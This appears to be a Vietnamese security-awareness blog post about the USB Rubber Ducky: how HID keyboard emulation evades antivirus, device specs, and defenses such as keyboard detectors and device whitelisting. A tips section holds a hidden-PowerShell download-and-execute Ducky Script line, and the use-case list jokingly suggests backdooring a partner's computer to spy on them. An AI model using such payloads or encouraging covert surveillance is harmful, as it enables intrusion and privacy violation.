# ⚠️ ĐỪNG TIN BẤT KÌ MỘT CÁI USB NÀO !

Đã có đến hàng chục triệu máy tính chỉ ở Việt Nam lây nhiễm virus chỉ thông qua USB. Và không chỉ có vậy, việc chính bạn bị chủ đích tân công chỉ thông qua 1 lần cắm USB cũng vô cùng dễ dàng .

 Qua bài viết này tôi sẽ cho các bạn thấy được khả năng máy tính của bạn bị 1 người có ít kiến thức về IT cũng có thể hack và theo dõi mọi hoạt động của bạn là vô cùng dễ dàng  
 
Chắc các bạn cũng đã quá quen với hình ảnh trong các bộ phim như Mr.Robot  ,Blackhat (2015) việc chỉ cần cắm 1 cái usb vào và DONE ! You have been hacked ! Và điều đó là hoàn toàn có thể xảy ra là thực tế. Hãy tìm hiểu loại usb dưới đây 


## USB RUBBER DUCKY
Đây  là 1 sản phẩm của bên Hak5 sản xuất và bán trên thị trường bên Mỹ với giá 50$ 

![](https://images.viblo.asia/27295e7c-125f-4551-b9dd-735dfa08f80c.jpg)

Hãy tưởng tượng bạn có thể đi đến một máy tính cho dù bất kệ hệ điều hành nào như MacOS,Windows,Linux.., cắm một ổ USB dường như vô hại và để nó cài đặt một back door, đánh cắp mật khẩu , tài liệu hoặc làm bất kì tác vụ nào và chỉ trong vài giây.

## Vậy nó hoạt động như thế nào ? 
HID (Human Interface Device): là một phân lớp (class) trong tiêu chuẩn USB. Một thiết bị HID có thể được lập trình để định nghĩa lại chức năng của nó. Bằng cách lập trình lại vi điều khiển của thiết bị HID, tin tặc có thể giả lập các hành vi của bàn phím, chuột để gởi các thông tin dữ liệu mong muốn đến máy tính/ thiết bị kết nối nhằm thực thi mã độc chiếm quyền điều khiển.
Do đặc tính linh động và có thể định nghĩa lại vi xử lý, HID có thể ẩn mình dưới nhiều hình dạng và chức năng khác nhau như: bộ sạc nguồn, bàn phím, quạt USB, đèn USB, đầu đọc thẻ nhớ, đồng hồ,...
USB Rubber Ducky truyền tải payloads mạnh mẽ trong vài giây bằng cách tận dụng sự tin tưởng tất cả các thiết bị HID (đánh lừa nó là thiết bị HID và được máy tính xác nhận Trust ) và đồng thời khi đánh lừa con người bằng cách giả làm một ổ USB thông thường. 

![](https://images.viblo.asia/86b19df4-547c-40e0-b03c-a14207c12d94.png)

Như bạn biết, một USB thông thường hay bàn phím thì khi kết nối đến máy tính sẽ hoạt động bình thường như đúng chức năng của nó

Nếu đó là USB thông thường chứa mã độc (thường thì trong usb có các payload và sẽ autorun để khi cắm vào sẽ execute chúng )thì khi cắm vào máy tính sẽ bị trình diệt Virus quét các payload trong nó và xóa ngay lập tức, hoặc bị tắt hay xóa mất autorun, nếu muốn chạy thì phải vào usb và chạy script bằng tay.

Đối với bàn phím sử dụng để execute mã độc hay chính là loại USB Rubber ducky tôi nói đến trong bài viết này thì trình diệt Virus sẽ bỏ qua vì máy tính nhận nó như một thiết bị ngoại vi, hiện lên là “Keyboard” - bàn phím trong Device Manager.

![](https://images.viblo.asia/8dd1b770-0915-44bc-ad5f-56f90a3935db.jpg)

Nó xảy xa bởi vì gần như mọi thiết bị máy tính đều chấp nhận một input từ bàn phím, do đó, thiết bị này nhắm đến đặc điểm HID phổ biến - Hay có thể hiểu là máy tính sẽ nhận diện USB kia chính là 1 bàn phím bình thường . Nó sẽ tự thông báo cho máy tính là thiết bị HID và lần lượt tự động được nhận dạng và chấp nhận. Hay nói cho đơn giản, nó giống như việc bạn ngồi ngay đó và tự gõ và thực thi bất kỳ lệnh gì bằng chính bàn phím của bạn (Nhưng lần này nhờ vào CPU 60MHz trong USB đó nên việc "gõ" nó sẽ chỉ xảy ra trong 1 vài giây). Vậy thì dù có mở ra 1 backdoor kết nối ra bên ngoài thì hành động đó cũng chính là do "tự bạn thực thi bằng bàn phím" cho nên av sẽ không detect và xóa.

## Thông số :

- Sử dụng Script riêng khá đơn giản gọi là Ducky Script để tạo ra các payload. Chi tiết bạn có thể tìm ở https://ducktoolkit.com/
- Sử dụng 60 MHz 32-bit CPU AT32UC3B1256
- Hỗ trợ cổng USB loại A,  thể nhớ ngoài , nút bấm để thực thi , chip JTAG interface với GPIO và DFU bootloader

## Mục đích sử dụng :
- Có vẻ khá hợp lý với những ai lười config 1 cái gì đó làm đi làm lại liên tục thì có thể tạo 1 script rồi chỉ việc cắm vào thôi 
- Hack máy tính người yêu , mở 1 backdoor chẳng hạn để xem xem có cặp sừng nào của mình trong máy không
- Nó có thể gõ 1000 từ/ phút cho nên việc hack mà không phát hiện khá là dễ. Chỉ việc cắm vào và nó sẽ gõ và thực thi các script và payload có sẵn và cho hết thúc chỉ trong vài giây mà **không bị AV detect và chặn**

## Demo 
{@embed: https://www.youtube.com/watch?v=RO7qcNPAyfY}

tips: 
STRING powershell -windowstyle hidden (new-object System.Net.WebClient).DownloadFile('http://127.0.0.1/sc.txt', '%temp%/update.vbs'); %temp%/update.vbs
in the line of code you would write " windowstyle hidden"
thats how you can keep it in the background

## Cách ngăn chặn:
Để ngăn chặn bị tấn công bằng cách sử dụng những loại USB như thế này thì bạn có thể :

- Sử dụng ứng dụng Penteract Disguised-Keyboard Detector
Penteract Disguised-Keyboard Detector nhận diện sự tân công bằng cách khóa màn hình khi mà nhận diện 1 bàn bàn phím được cắm vào. Điều đó có nghĩa nếu mà đó là bàn phím thật thì bạn chỉ việc mở khóa màn hình như bình thường.. Còn nếu không phải thì máy tính sẽ không thực thi các câu lệnh cho đến khi chủ của máy tính đó ở đó và mở màn mình

- Sử dụng Product ID & Vendor ID của các thiết bị và import vào whitelisting . Nhưng nhớ rằng điều này sẽ dẫn đến hệ thống sẽ disable bất kì thiết bị nào không trong danh sách whitelist, nó có thể webcam, đầu đọc thẻ,...

## Kết thúc : 
**Bạn hứng thú với những khả năng của loại usb này? Hãy đón chờ trong bài viết tiếp theo, tôi sẽ hướng dẫn các bạn có thể có 1 con usb như thế này cho riêng mình với giá chỉ  bằng 1/3**

UPDATED : https://viblo.asia/p/tu-che-mot-usb-rubber-ducky-de-xam-nhap-Ljy5V7VkKra